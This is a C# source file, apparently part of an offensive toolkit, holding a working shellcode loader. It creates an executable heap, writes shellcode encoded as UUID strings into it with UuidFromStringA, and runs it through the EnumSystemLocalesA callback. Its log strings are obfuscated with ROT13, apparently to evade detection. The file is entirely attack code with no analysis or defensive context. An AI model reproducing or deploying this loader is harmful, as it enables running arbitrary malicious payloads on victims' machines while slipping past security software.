//start
using System.Text;
using System.Linq;
using System;
﻿

namespace McChicken
{
    class CurrentThreadUuid
    {
        public static void Execute(string shellcode, bool debug = false)
        {
            #region HeapCreate

            var hHeap = Win32.HeapCreate((uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero);

            if (hHeap != null)
                Console.WriteLine(new string("(PheeragGuernqHhvq) [+] UrncPerngr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception(new string("(PheeragGuernqHhvq) [-] UrncPerngr: ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + hHeap.ToString("x2"));

            #endregion

            #region UuidFromStringA

            var uuids = shellcode.Split('|');
            IntPtr heapAddress = IntPtr.Zero;

            for (int i = 0; i < uuids.Length; i++)
            {
                heapAddress = IntPtr.Add(hHeap, 16 * i);
                _ = Win32.UuidFromStringA(uuids[i], heapAddress);
            }

            Console.WriteLine(new string("(PheeragGuernqHhvq) [+] HhvqSebzFgevatN".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            #endregion

            #region EnumSystemLocalesA

            var result = Win32.EnumSystemLocalesA(hHeap, 0);

            if (result)
                Console.WriteLine(new string("(PheeragGuernqHhvq) [+] RahzFlfgrzYbpnyrfN".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception(new string("(PheeragGuernqHhvq) [-] RahzFlfgrzYbpnyrfN".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            #endregion
        }
    }
}
